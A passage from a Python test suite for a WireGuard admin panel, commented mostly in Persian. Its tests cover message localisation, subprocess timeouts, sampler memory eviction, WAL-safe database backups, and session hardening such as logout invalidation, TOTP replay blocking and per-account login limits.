        m.send_periodic_report = lambda: (True, "api.ok.sent")
        h = make_fake_handler(m, path="/api/report/test", method="POST",
                              body={}, headers={"Cookie": "wgl=en"},
                              session={"u": "admin", "r": "admin"})
        h.do_POST()
        r = json.loads(b"".join(h.body).decode("utf-8"))
        self.assertTrue(r["ok"], r)
        self.assertEqual(r["message"],
                         "Building and sending — check Telegram in a few "
                         "seconds")

    def test_every_aerr_call_matches_its_catalog_placeholders(self):
        """پارامترهای aerr باید دقیقاً جای‌گیرهای همان کلید باشند.

        `t()` جای‌گیرِ ناجور را **می‌بلعد** — عمدی، تا جای‌گیرِ خراب صفحه
        را نشکند:

            if kw:
                try:
                    s = s.format(**kw)
                except (KeyError, IndexError, ValueError):
                    pass

        نتیجه‌اش این است که کلیدی با `{perm}` که `aerr` آن را با `name=`
        صدا بزند، پیامی می‌دهد که «{perm}» خام در آن دیده می‌شود — و هیچ
        تستِ موجودی نمی‌گیردش: نه گاردِ کاملیِ کاتالوگ (چهار ستون سرِ
        جایشان‌اند)، نه گاردِ هم‌خوانیِ جای‌گیرها (بینِ زبان‌ها می‌سنجد،
        نه با فراخوان). این تنها تنها شکستِ خاموشِ مسیرِ خطاهای پارامتردار
        است.

        کلیدِ **پویا** عمداً نادیده گرفته می‌شود؛ این گارد فقط چیزی را
        می‌گیرد که ایستا اثبات‌پذیر است.
        """
        import ast
        src = _read_panel_source()
        ph = re.compile(r"\{(\w+)\}")
        bad, seen = [], 0
        for n in ast.walk(ast.parse(src)):
            if not (isinstance(n, ast.Call) and isinstance(n.func, ast.Name)
                    and n.func.id == "aerr"):
                continue
            seen += 1
            if not (n.args and isinstance(n.args[0], ast.Constant)
                    and isinstance(n.args[0].value, str)):
                continue                      # کلیدِ پویا — بیرونِ دیدِ گارد
            key = n.args[0].value
            row = self.m.I18N.get(key)
            if row is None:
                bad.append("%d: کلیدِ ناموجود %s" % (n.lineno, key))
                continue
            want = set(ph.findall(row[0]))
            got = {kw.arg for kw in n.keywords if kw.arg}
            if want != got:
                bad.append("%d: %s جای‌گیر=%s پارامتر=%s"
                           % (n.lineno, key, sorted(want), sorted(got)))
        self.assertEqual(bad, [], "aerr ناهم‌خوان با کاتالوگ: %s" % bad)
        # گاردِ خودِ گارد: اگر روزی aerr با نامِ دیگری صدا زده شود، این
        # تست بی‌صدا هیچ‌چیز را نمی‌سنجد و همیشه سبز می‌ماند.
        self.assertGreaterEqual(seen, 20,
                                "فراخوانِ aerr کمتر از انتظار پیدا شد (%d) — "
                                "الگوی گارد کهنه شده؟" % seen)


def _persian_returns(src):
    """{نامِ تابع: [خطِ return ِ دارای ثابتِ رشته‌ایِ فارسی، ...]}.

    نامِ متد با کلاسش می‌آید (SpeedTester.drop_alert_text). تابعِ تودرتو به
    نامِ خودش شمرده می‌شود، نه تابعِ بیرونی.
    """
    import ast
    tree = ast.parse(src)
    parents = {}
    for node in ast.walk(tree):
        for ch in ast.iter_child_nodes(node):
            parents[ch] = node

    def owner(n):
        while n in parents:
            n = parents[n]
            if isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef)):
                cls = parents.get(n)
                return ((cls.name + ".") if isinstance(cls, ast.ClassDef)
                        else "") + n.name
        return "<module>"

    fa = re.compile(r"[؀-ۿ]")
    out = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Return) and node.value is not None and any(
                isinstance(c, ast.Constant) and isinstance(c.value, str)
                and fa.search(c.value) for c in ast.walk(node.value)):
            out.setdefault(owner(node), []).append(node.lineno)
    return out


class PersianReturnGuardTests(unittest.TestCase):
    """پیامی که توابع برمی‌گردانند باید کلیدِ کاتالوگ باشد، نه فارسیِ ثابت.

    پیش از این ۶۶ return در ۲۸ تابع متنِ فارسیِ آماده برمی‌گرداندند؛ همان
    متن هم به مرورگر می‌رفت، هم به ربات، هم به ممیزی — پس کاربرِ en/ru/zh
    هر شکست (و هر «انجام شد») را فارسی می‌دید. `ApiErrorLanguageTests`
    فقط مقدارِ `"error":` در خودِ هندلر را می‌پاید و این‌ها از کنارش رد
    می‌شدند، چون پیام از تابعِ دیگری می‌آمد.
    """

    # توابعی که تبدیل شدند — هر فارسیِ تازه در return ِ این‌ها رگرسیون است.
    CONVERTED = (
        "set_user_password", "set_peer_enabled", "add_peer", "delete_peer",
        "set_peer_psk", "update_peer_ips", "restore_from_tar",
        "restore_from_nightly_tar", "create_share", "toggle_tunnel",
        "_s4_target", "cloud_restore_panel", "AlertManager.send_now",
        "warp_preset_apply", "warp_validate_target", "warp_targets_write",
        "warp_apply", "warp_src_label", "bot_owner_violation",
        "bot_admin_grant_violation", "parse_login_chat", "verify_login_chat",
        "svc_add_custom", "svc_probe_one",
    )

    # استثناهای عمدی. هر ردیفِ تازه باید دلیل داشته باشد، نه صرفاً سبز کند.
    ALLOWED = {
        # قالب‌بندِ ارقام برای متنِ فارسی («٫» ممیزِ فارسی)، نه پیام
        "_fa_num",
        # قالب‌بندِ «٪» درونِ گزارشِ تصویریِ تلگرام (فقط در همان گزارش)
        "pct",
        # جداکنندهٔ «، » درونِ هشدارِ تلگرامی که با A() ساخته می‌شود
        "SpeedTester.drop_alert_text",
        # پیامش فقط به log_action می‌رود («report test: …»)
        "send_periodic_report",
        # برچسبِ دوم را تنها فراخوانش (svc_probe_one) دور می‌ریزد؛ مرورگر
        # از کدِ verdict و SVC_VERDICT ترجمه می‌کند
        "_verdict",
    }

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-fareturn-")
        self.m = load_module(self.tmp)
        self.m.CONFIG["users"] = [
            {"username": "admin", "salt": "a" * 32, "hash": "h",
             "role": "admin", "totp": "T" * 16, "stoken": "s1"}]
        with open(os.path.join(self.tmp, "wgtest.conf"), "w",
                  encoding="utf-8") as f:
            f.write(FIXTURE_CONF)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_converted_functions_return_no_persian_literal(self):
        found = _persian_returns(_read_panel_source())
        bad = {f: found[f] for f in self.CONVERTED if f in found}
        self.assertEqual(bad, {}, "فارسیِ ثابت در return ِ تابعِ تبدیل‌شده؛ "
                                  "کلیدِ api.* یا aerr(...) بسازید")

    def test_only_allowlisted_functions_return_persian(self):
        """تابعِ **تازه**ای هم که فارسی برگرداند باید این‌جا دیده شود."""
        found = _persian_returns(_read_panel_source())
        extra = {f: ln for f, ln in found.items() if f not in self.ALLOWED}
        self.assertEqual(extra, {},
                         "return ِ فارسی بیرون از فهرستِ استثنا — اگر به "
                         "مرورگر یا API می‌رسد کلید بسازید، اگر به ربات "
                         "می‌رسد self.T(...)، وگرنه با دلیل به ALLOWED بیفزایید")

    def test_the_guard_still_sees_its_functions(self):
        """گاردِ خودِ گارد: تغییرِ نام نباید تابعی را بی‌صدا از دید بیرون ببرد."""
        import ast
        tree = ast.parse(_read_panel_source())
        names = set()
        for n in tree.body:
            if isinstance(n, ast.FunctionDef):
                names.add(n.name)
            elif isinstance(n, ast.ClassDef):
                names.update(n.name + "." + f.name for f in n.body
                             if isinstance(f, ast.FunctionDef))
        missing = [f for f in self.CONVERTED if f not in names]
        self.assertEqual(missing, [], "تابعِ ناموجود در CONVERTED")
        # ALLOWED باید همین حالا واقعاً فارسی برگرداند؛ ردیفِ مرده یعنی
        # جایی که بعداً کسی می‌تواند بی‌صدا فارسی بریزد
        self.assertEqual(set(_persian_returns(_read_panel_source())),
                         self.ALLOWED, "ALLOWED با واقعیت هم‌خوان نیست")

    def test_no_code_rebinds_the_name_aerr(self):
        """انتساب به نامِ `aerr` آن را محلیِ **کلِ** تابع می‌کند.

        do_POST یک بار `aerr = bot_admin_grant_violation(...)` داشت؛ نتیجه
        این بود که هر ۱۳ فراخوانِ `aerr(...)` در do_POST — مثلاً شناسهٔ
        نامعتبرِ ربات در /api/bot/save — به‌جای پیامِ خطا UnboundLocalError
        می‌داد. py_compile و گاردِ جای‌گیرها هیچ‌کدام این را نمی‌بینند.
        """
        import ast
        bad = []
        for n in ast.walk(ast.parse(_read_panel_source())):
            if isinstance(n, ast.Name) and n.id in ("aerr", "adet") \
                    and isinstance(n.ctx, (ast.Store, ast.Del)):
                bad.append(n.lineno)
            elif isinstance(n, ast.arg) and n.arg in ("aerr", "adet"):
                bad.append(n.lineno)
        self.assertEqual(bad, [], "نامِ aerr/adet دوباره انتساب شد")

    def _post(self, path, body, lang):
        h = make_fake_handler(self.m, path=path, method="POST", body=body,
                              headers={"Cookie": "wgl=%s" % lang},
                              session={"u": "admin", "r": "admin"})
        h.do_POST()
        return json.loads(b"".join(h.body).decode("utf-8"))

    def test_invalid_client_name_follows_the_request_language(self):
        """مسیرِ کامل: do_POST ← add_peer ← _json، در هر چهار زبان."""
        want = {"fa": "حروف", "en": "Latin letters", "ru": "латинские",
                "zh": "拉丁字母"}
        for lang, needle in want.items():
            with self.subTest(lang=lang):
                r = self._post("/api/peer/add",
                               {"iface": "wgtest", "name": "bad name!"}, lang)
                self.assertFalse(r["ok"])
                self.assertIn(needle, r["error"])
                if lang != "fa":
                    self.assertNotRegex(r["error"], r"[؀-ۿ]")

    def test_bad_bot_id_returns_an_error_not_a_crash(self):
        """رگرسیونِ سایه‌افتادنِ aerr در do_POST (بالا را ببین)."""
        r = self._post("/api/bot/save", {"users": [{"id": "abc"}]}, "en")
        self.assertFalse(r["ok"])
        self.assertIn("abc", r["error"])
        self.assertIn("numeric", r["error"])

    def test_success_message_follows_the_request_language(self):
        r = self._post("/api/peer/toggle",
                       {"iface": "wgtest", "name": "user01", "enable": True},
                       "en")
        self.assertTrue(r["ok"], r)
        self.assertEqual(r["message"], "Done")

    def test_a_key_inside_a_parameter_is_translated_too(self):
        """«"x": چرا» — چرا خودش کلید است و باید ترجمه شود، نه خام بماند."""
        m = self.m
        _, _, why = m.warp_validate_target("not_a_domain")
        wrapped = m.aerr("api.err.warp.t.entry", entry="not_a_domain", why=why)
        txt = m.api_text(wrapped, "en")
        self.assertEqual(txt, "“not_a_domain”: The domain name is not valid")
        _, err = m.warp_targets_write(["not_a_domain"], "t")
        self.assertEqual(m.api_text(err, "en"), txt)

    def test_prefix_style_keys_keep_their_system_text(self):
        """api.err.apply.* و keygen پیش‌تر با `+` به متنِ خطا چسبانده می‌شدند
        و در نتیجه هرگز کلید شناخته نمی‌شدند (کاربر «api.err.keygen…» می‌دید)."""
        m = self.m
        m.run = lambda cmd, timeout=20: (1, "", "boom")
        _, err = m.add_peer("wgtest", "newguy")
        self.assertEqual(m.api_text(err, "en"),
                         "Error generating the key: boom")

    def test_audit_detail_parameters_are_translated_for_the_viewer(self):
        """کاتالوگِ مرورگر فقط ui.* دارد؛ why=کلیدِ api.* باید متن شود."""
        m = self.m
        d = m.adet("ui.audit.det.failed", why="api.err.name")
        o = json.loads(m.audit_detail_text(d, "en"))
        self.assertEqual(o["k"], "ui.audit.det.failed")
        self.assertIn("Latin letters", o["p"]["why"])
        # جزئیاتِ ساده‌ای که خودش کلید است هم
        self.assertEqual(m.audit_detail_text("api.ok.sent", "ru"),
                         "Отправлено")
        # متنِ آزادِ قدیمی دست نمی‌خورد
        self.assertEqual(m.audit_detail_text("متنِ قدیمی", "en"), "متنِ قدیمی")

    def test_bot_relays_shared_messages_in_the_chat_language(self):
        m = self.m
        bot = m.TelegramBot.__new__(m.TelegramBot)
        bot._lang = "en"
        self.assertEqual(bot.M("api.ok.deleted"), "Deleted")
        # متنِ خامِ سیستم فقط escape می‌شود
        self.assertEqual(bot.M("a < b"), "a &lt; b")


class SubprocessBoundTests(unittest.TestCase):
    """هر فرزندی که پنل می‌سازد باید کران داشته باشد."""

    def test_every_subprocess_run_has_a_timeout(self):
        """هیچ subprocess.run بدونِ timeout نماند.

        فرزندِ گیرکرده نخ را برای همیشه می‌گیرد. سه فراخوانی در ناحیه‌ی
        نوشتنِ کانفیگِ WireGuard این را نداشتند — همان ناحیه‌ای که
        _conf_lock را نگه می‌دارد. خودِ پنل run(cmd, timeout=20) دارد؛
        آن سه به‌خاطرِ `input=` دورش می‌زدند (run پارامترِ stdin ندارد).
        """
        import ast
        src = _read_panel_source()
        bad = []
        for n in ast.walk(ast.parse(src)):
            if not isinstance(n, ast.Call):
                continue
            f = n.func
            if (isinstance(f, ast.Attribute) and f.attr == "run"
                    and getattr(getattr(f, "value", None), "id", "") == "subprocess"):
                if not any(k.arg == "timeout" for k in n.keywords):
                    bad.append(n.lineno)
        self.assertEqual(bad, [],
                         "subprocess.run بدونِ timeout در خطوط: %s" % bad)

    def test_no_unbounded_subprocess_api_is_used(self):
        """Popen/check_output/call هم نباید بدونِ مهار استفاده شوند.

        خانواده‌ی باگ «فرزندی که می‌تواند برای همیشه صبر کند» است، نه
        فقط یک نامِ تابع. اگر روزی یکی واقعاً لازم شد، همین‌جا صریح
        استثنا شود — نه با شل‌کردنِ الگو.
        """
        import ast
        src = _read_panel_source()
        RISKY = {"Popen", "check_output", "call", "check_call"}
        found = [(n.lineno, n.func.attr)
                 for n in ast.walk(ast.parse(src))
                 if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute)
                 and n.func.attr in RISKY
                 and getattr(getattr(n.func, "value", None), "id", "") == "subprocess"]
        self.assertEqual(found, [], "APIِ مهارنشده‌ی subprocess: %s" % found)

    def test_wg_pubkey_returns_the_failure_shape_on_timeout(self):
        """مهلت که سر برود، باید (False, "") برگردد نه استثنا.

        افزودنِ timeout یک هنگ را به **استثنا** تبدیل می‌کند؛ اگر
        فراخواننده نگیردش، هنگِ نخ به ۵۰۰ تبدیل می‌شود — و در این ناحیه
        احتمالاً به کانفیگی نیمه‌اعمال‌شده.
        """
        import subprocess as sp
        m = self.m
        logged = []
        m.log_action = lambda msg: logged.append(msg)
        real = sp.run

        def boom(*a, **k):
            raise sp.TimeoutExpired(cmd="wg pubkey", timeout=10)
        m.subprocess.run = boom
        try:
            self.assertEqual(m.wg_pubkey("PRIV"), (False, ""))
        finally:
            m.subprocess.run = real
        self.assertTrue([x for x in logged if "timeout" in x],
                        "مهلتِ سررفته در actions.log ثبت نشد")

    def test_wg_pubkey_survives_a_missing_binary(self):
        """نبودِ خودِ باینری هم نباید استثنا بیرون بدهد."""
        import subprocess as sp
        m = self.m
        m.log_action = lambda msg: None
        real = sp.run

        def gone(*a, **k):
            raise OSError(2, "No such file or directory")
        m.subprocess.run = gone
        try:
            self.assertEqual(m.wg_pubkey("PRIV"), (False, ""))
        finally:
            m.subprocess.run = real

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-sp-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)


class SamplerEvictionTests(unittest.TestCase):
    """حالتِ درون‌حافظه‌ایِ Sampler هرگز جارو نمی‌شد.

    سرویس ماه‌ها بالا می‌ماند (قاعده‌ی مخزن ری‌بوت را ممنوع می‌کند)، پس
    روی استقراری که پیر جابه‌جا می‌کند نشت یک‌طرفه و دائمی است.
    """

    DICTS = ("prev", "rates", "history", "pending")

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-evict-")
        self.m = load_module(self.tmp)
        s = self.m.Sampler.__new__(self.m.Sampler)
        s.lock = threading.Lock()
        for name in self.DICTS + ("ring10", "acc10"):
            setattr(s, name, {})
        s.latest = {"ifaces": {}, "peers": []}
        self.s = s

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_sampler_evicts_state_for_deleted_peers(self):
        """حالتِ پیرِ حذف‌شده آزاد شود، پیرِ زنده و تجمیع‌ها بمانند."""
        s = self.s
        live, dead = ("wgtest", "PUB_LIVE"), ("wgtest", "PUB_GONE")
        for name in self.DICTS + ("ring10", "acc10"):
            d = getattr(s, name)
            d[live] = "x"
            d[dead] = "x"
        s.ring10[("agg", "wgtest")] = "agg"     # تجمیعِ اینترفیس
        s.ring10[("net", "eth0")] = "net"
        s.acc10[("agg", "wgtest")] = "agg"
        s._known_peer_keys = lambda: {live}
        n = s._evict_gone_peers()
        self.assertGreater(n, 0, "هیچ چیزی جارو نشد")
        for name in self.DICTS + ("ring10", "acc10"):
            d = getattr(s, name)
            with self.subTest(dict=name):
                self.assertIn(live, d, "پیرِ زنده پاک شد")
                self.assertNotIn(dead, d, "پیرِ حذف‌شده باقی ماند")
        self.assertIn(("agg", "wgtest"), s.ring10, "تجمیعِ اینترفیس پاک شد")
        self.assertIn(("net", "eth0"), s.ring10, "ردیفِ net پاک شد")
        self.assertIn(("agg", "wgtest"), s.acc10, "تجمیعِ acc10 پاک شد")

    def test_eviction_does_nothing_when_the_peer_list_is_empty(self):
        """مجموعه‌ی خالی یعنی خطای خواندن، نه «همه حذف شدند».

        بدونِ این گارد، یک OSError ِ گذرا هنگامِ خواندنِ کانفیگ کلِ
        تاریخچه‌ی همه‌ی پیرها را پاک می‌کرد — داده‌ای که برنمی‌گردد.
        """
        s = self.s
        for name in self.DICTS:
            getattr(s, name)[("wgtest", "PUB")] = "x"
        s._known_peer_keys = lambda: set()
        self.assertEqual(s._evict_gone_peers(), 0)
        self.assertIn(("wgtest", "PUB"), s.prev, "با مجموعه‌ی خالی جارو شد")

    def test_a_configured_but_offline_peer_is_not_evicted(self):
        """پیرِ پیکربندی‌شده‌ی خاموش نباید جارو شود.

        تاریخچه‌اش دقیقاً همان چیزی است که اپراتور برای فهمیدنِ «کِی
        قطع شد» نگاه می‌کند. این تست علیهِ **خودِ** _known_peer_keys
        اجرا می‌شود، نه یک لامبدا — وگرنه چیزی را ثابت نمی‌کند.
        """
        m, s = self.m, self.s
        # هیچ پیری زنده نیست، ولی یکی در کانفیگ هست
        s.latest = {"ifaces": {}, "peers": []}
        m.server_ifaces = lambda: ["wgtest"]
        m.parse_user_blocks = lambda iface, lines=None: [
            {"name": "offline1", "public_key": "PUB_OFFLINE", "enabled": True}]
        keys = s._known_peer_keys()
        self.assertIn(("wgtest", "PUB_OFFLINE"), keys,
                      "پیرِ خاموشِ پیکربندی‌شده در مجموعه‌ی زنده نیست")
        for name in self.DICTS:
            getattr(s, name)[("wgtest", "PUB_OFFLINE")] = "x"
        s._evict_gone_peers()
        self.assertIn(("wgtest", "PUB_OFFLINE"), s.prev,
                      "پیرِ خاموش جارو شد — تاریخچه‌اش از دست رفت")

    def test_a_config_read_error_yields_an_empty_set_not_a_partial_one(self):
        """خطای خواندن باید مجموعه‌ی **خالی** بدهد، نه ناقص.

        مجموعه‌ی ناقص بدتر از خالی است: گاردِ خالی را رد می‌کند و بعد
        پیرهای واقعی را جارو می‌کند.
        """
        m, s = self.m, self.s
        s.latest = {"peers": [{"iface": "wgtest", "public_key": "PUB_LIVE"}]}
        m.server_ifaces = lambda: ["wgtest"]

        def boom(*a, **k):
            raise OSError(5, "I/O error")
        m.parse_user_blocks = boom
        m.log_action = lambda *a, **k: None
        self.assertEqual(s._known_peer_keys(), set(),
                         "خطای خواندن مجموعه‌ی ناقص داد")


class WalSafeBackupTests(unittest.TestCase):
    """بکاپ فقط فایلِ اصلیِ دیتابیس را می‌گرفت، و traffic.db در حالتِ
    WAL است.

    شکلِ خرابی این بود که هیچ نشانه‌ای نداشت: آرشیو سالم باز می‌شد،
    بی‌خطا بازیابی می‌شد، و فقط داده کمتر داشت. تنها شاهدِ اپراتور بر
    درست‌بودنِ بکاپ همان «بی‌خطا بازیابی شد» بود.
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-wal-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        con = getattr(self, "_held", None)
        if con is not None:
            con.close()
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _seed_wal(self, rows=500):
        """ردیف می‌نویسد و اتصال را **باز** نگه می‌دارد.

        🪤 ‏close() ِ آخرین اتصال خودش checkpoint می‌کند و WAL را
        برمی‌دارد — یعنی فیکسچری که اتصال را می‌بندد اصلاً وضعیتِ موردِ
        آزمون را نمی‌سازد و تست بی‌معنا سبز می‌شود. اتصال در tearDown
        بسته می‌شود.
        """
        import sqlite3
        con = sqlite3.connect(self.m.DB_PATH, timeout=10)
        con.execute("PRAGMA journal_mode=WAL")
        con.execute("PRAGMA synchronous=NORMAL")
        con.execute("CREATE TABLE IF NOT EXISTS waltest(x)")
        con.executemany("INSERT INTO waltest VALUES (?)",
                        [(i,) for i in range(rows)])
        con.commit()
        self._held = con                  # باز می‌ماند تا WAL نپرد
        wal = self.m.DB_PATH + "-wal"
        self.assertTrue(os.path.exists(wal) and os.path.getsize(wal) > 0,
                        "فیکسچر WAL نساخت — فرضِ تست برقرار نیست")
        return rows

    def test_backup_includes_data_still_in_the_wal(self):
        """داده‌ای که هنوز در WAL است باید در بکاپ بیاید.

        اندازه‌گیریِ ۱۳ اوت ۲۰۲۶ روی فیکسچرِ خام: بعد از ۱۰۰۰ درج و
        commit، فایلِ اصلی ۴۰۹۶ بایت بود و WAL ‏۲۸٬۸۷۲ — کپیِ
        فایل‌سیستمی حتی **جدول را هم نداشت**، نه اینکه ردیف کم داشته
        باشد.
        """
        import io
        import sqlite3
        import tarfile
        rows = self._seed_wal()
        raw = self.m.backup_archive_bytes()
        with tarfile.open(fileobj=io.BytesIO(raw), mode="r:gz") as tar:
            f = tar.extractfile("traffic.db")
            self.assertIsNotNone(f, "traffic.db در آرشیو نیست")
            out = os.path.join(self.tmp, "from-archive.db")
            with open(out, "wb") as fh:
                fh.write(f.read())
        con = sqlite3.connect(out)
        try:
            n = con.execute("SELECT count(*) FROM waltest").fetchone()[0]
        finally:
            con.close()
        self.assertEqual(n, rows, "داده‌ی داخلِ WAL در بکاپ نیامد")

    def test_taking_a_backup_does_not_mutate_the_live_database(self):
        """بکاپ نباید موضوعش را دست بزند.

        جایگزینِ ساده‌ترِ این رفع — wal_checkpoint(TRUNCATE) و بعد
        tar.add — دیتابیسِ زنده را به‌عنوانِ عارضه‌ی گرفتنِ بکاپ تغییر
        می‌دهد. این تست همان انتخاب را پین می‌کند.
        """
        self._seed_wal()
        wal = self.m.DB_PATH + "-wal"
        before = os.path.getsize(wal)
        self.m.backup_archive_bytes()
        self.assertTrue(os.path.exists(wal), "بکاپ فایلِ WAL را حذف کرد")
        self.assertEqual(os.path.getsize(wal), before,
                         "بکاپ WAL ِ زنده را checkpoint کرد")

    def test_restore_removes_stale_wal_sidecars(self):
        """سایدکارِ WAL ِ کهنه نباید روی دیتابیسِ بازیابی‌شده اعمال شود.

        این خطرناک‌ترین نیمه‌ی یافته است: نتیجه‌اش **خرابی** است، نه
        فقط از دست رفتنِ داده. تا ۱۳ اوت ۲۰۲۶ هیچ‌جای wg_panel.py
        سایدکارها را لمس نمی‌کرد (هارنسِ تست می‌کرد، مسیرِ بازیابی نه).
        """
        m = self.m
        self._seed_wal()
        for suffix in ("-wal", "-shm"):
            with open(m.DB_PATH + suffix, "wb") as f:
                f.write(b"stale")
        m._db_sidecars_clear()
        for suffix in ("-wal", "-shm"):
            self.assertFalse(os.path.exists(m.DB_PATH + suffix),
                             "سایدکارِ %s پاک نشد" % suffix)

    def test_both_restore_paths_clear_the_sidecars(self):
        """هر دو مسیرِ بازیابی باید سایدکارها را پاک کنند.

        دو مسیر با دو چیدمانِ آرشیوِ متفاوت وجود دارد (traffic.db و
        wg-panel/traffic.db)؛ رفعِ یکی بدونِ دیگری نیمی از مسئله است.
        """
        src = _read_panel_source()
        for fn in ("restore_from_tar", "cloud_restore"):
            i = src.find("def %s(" % fn)
            if i < 0:
                continue
            seg = src[i:i + 6000]
            with self.subTest(fn=fn):
                self.assertIn("_db_sidecars_clear()", seg,
                              "%s سایدکارها را پاک نمی‌کند" % fn)


class SessionHardeningTests(unittest.TestCase):
    """نشست کوکیِ امضاشده‌ی بدونِ حالتِ سمتِ سرور است — که طراحیِ معقولی
    است، ولی سه یافته را تیزتر می‌کند چون دستگیره‌ای برای ابطال نیست."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-sess-")
        self.m = load_module(self.tmp)
        self.m.CONFIG["users"] = [
            {"username": "admin", "salt": "a" * 32, "hash": "h",
             "role": "admin", "totp": "", "stoken": "tok0",
             "protected": True, "active": True}]

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_logout_invalidates_the_existing_cookie(self):
        """کوکیِ پیش از خروج نباید بعدش کار کند.

        پیش از این «خروج» فقط کوکیِ همان مرورگر را پاک می‌کرد. کپیِ
        کوکی — از ماشینِ مشترک، sync ِ مرورگر، لاگِ پروکسی — تا انقضا
        معتبر می‌ماند، در حالی که کاربر فکر می‌کرد خارج شده.
        """
        m = self.m
        u = m.CONFIG["users"][0]
        cookie = m.make_session_cookie(u)
        self.assertIsNotNone(m.verify_session_cookie(cookie),
                             "کوکیِ تازه باید معتبر باشد")
        h = make_fake_handler(m, path="/api/logout", method="POST",
                              session={"u": "admin", "r": "admin"})
        h.do_POST()
        self.assertIsNone(m.verify_session_cookie(cookie),
                          "کوکیِ پیش از خروج هنوز معتبر است")

    def test_the_clearing_cookie_matches_the_real_one(self):
        """کوکیِ پاک‌کننده باید همان صفت‌ها را داشته باشد.

        بعضی مرورگرها بدونِ تطابقِ صفت‌ها کوکی را بازنویسی نمی‌کنند،
        یعنی پاک‌کردن بی‌صدا هیچ کاری نمی‌کند.
        """
        m = self.m
        h = make_fake_handler(m, path="/api/logout", method="POST",
                              session={"u": "admin", "r": "admin"})
        h.do_POST()
        got = dict(h.sent).get("Set-Cookie", "")
        for flag in ("HttpOnly", "SameSite=Strict", "Path=/"):
            self.assertIn(flag, got, "کوکیِ پاک‌کننده %s ندارد" % flag)

    def test_a_totp_code_cannot_be_used_twice(self):
        """کدِ TOTP یک‌بارمصرف است.

        پنجره‌ی پذیرش ±۱ گام × ۳۰ ثانیه است، پس یک کد تا ۹۰ ثانیه
        معتبر می‌ماند: هرکس یک بار ببیندش می‌تواند تکرارش کند. عاملِ
        دومی که تکرارپذیر باشد عاملِ دوم نیست.
        """
        m = self.m
        self.assertTrue(m.totp_consume("admin", "123456"))
        self.assertFalse(m.totp_consume("admin", "123456"),
                         "همان کد دوباره پذیرفته شد")

    def test_a_different_code_in_the_same_window_is_accepted(self):
        m = self.m
        self.assertTrue(m.totp_consume("admin", "111111"))
        self.assertTrue(m.totp_consume("admin", "222222"))

    def test_the_replay_cache_is_per_user(self):
        """کدِ یک کاربر نباید کدِ کاربرِ دیگر را بسوزاند."""
        m = self.m
        self.assertTrue(m.totp_consume("admin", "123456"))
        self.assertTrue(m.totp_consume("viewer", "123456"))

    def test_the_replay_cache_ttl_covers_the_whole_accepted_window(self):
        """TTL باید کلِ بازه‌ی پذیرشِ totp_verify را بپوشاند.

        کمتر، تکرار را باز می‌گذارد؛ بیشتر، کدِ مشروعِ بعدی را رد
        می‌کند. totp_verify از d ∈ (-1, 0, 1) × ۳۰ استفاده می‌کند.
        """
        m = self.m
        src = _read_panel_source()
        seg = src[src.index("def totp_verify("):][:600]
        self.assertIn("(-1, 0, 1)", seg, "پنجره‌ی totp_verify عوض شده؟")
        self.assertGreaterEqual(m._TOTP_WINDOW, 90,
                                "TTL کوچک‌تر از بازه‌ی پذیرش است")

    def test_account_backoff_applies_across_ip_addresses(self):
        """محدودیتِ per-account باید مستقل از IP باشد.

        per-IP تنها یعنی مهاجمی که تلاش‌ها را روی چند آدرس پخش کند
        بی‌نهایت شانس روی یک حساب دارد.
        """
        m = self.m
        for _ in range(m._LOGIN_USER_MAX):
            self.assertTrue(m.login_user_allowed("admin"))
            m.login_user_failed("admin")
        self.assertFalse(m.login_user_allowed("admin"),
                         "حساب بعد از سقف بسته نشد")

    def test_account_backoff_does_not_affect_other_accounts(self):
        m = self.m
        for _ in range(m._LOGIN_USER_MAX + 2):
            m.login_user_failed("admin")
        self.assertFalse(m.login_user_allowed("admin"))
        self.assertTrue(m.login_user_allowed("viewer"),
                        "حسابِ دیگر هم بسته شد")

    def test_account_backoff_recovers_without_admin_action(self):
        """قفل باید خودبه‌خود باز شود.

        قفلی که دخالتِ ادمین بخواهد، خودش سلاحِ انکارِ سرویس علیهِ
        نامِ کاربریِ معلوم است — بدتر از باگی که رفع می‌کند.
        """
        m = self.m
        old = time.time() - m._LOGIN_USER_WINDOW - 1
        m._login_attempts_user["admin"] = [old] * (m._LOGIN_USER_MAX + 5)
        self.assertTrue(m.login_user_allowed("admin"),
                        "پنجره گذشت ولی حساب باز نشد")

    def test_the_account_limiter_sweeps_like_its_siblings(self):
        """چهار سیاستِ تخلیه برای چهار محدودکننده یعنی یکی نشت می‌کند."""
        src = _read_panel_source()
        seg = src[src.index("def login_user_failed("):][:900]
        self.assertIn("> 4096", seg)
        self.assertIn("> 3600", seg)

    def test_metrics_token_uses_a_constant_time_comparison(self):
        """مقایسه‌ی توکنِ متریک باید زمان‌ثابت باشد.

        ℹ️ این از قبل درست بود — گاردِ رگرسیون است، نه رفع. مقدمه‌ی
        پلن (`==` بودنِ مقایسه) با کدِ امروز نمی‌خواند.
        """
        src = _read_panel_source()
        body = "\n".join(l for l in src.splitlines()
                         if not l.lstrip().startswith("#"))
        # لنگر روی خودِ **مقایسه** است، نه اولین ذکرِ نام (که در
        # migrate_config است و ربطی به این ندارد).
        seg = body[body.index('CONFIG.get("metrics_token"'):][:400]
        self.assertIn("compare_digest", seg)


class RoleEscalationTests(unittest.TestCase):
    """گاردِ ارتقای دسترسی باید بپرسد نقش **چه می‌تواند بکند**، نه چه
    نامیده می‌شود."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-esc-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_a_privileged_role_by_any_name_is_caught(self):
        """نقشی که users.manage دارد باید ممتاز شمرده شود، هر نامی داشته باشد.

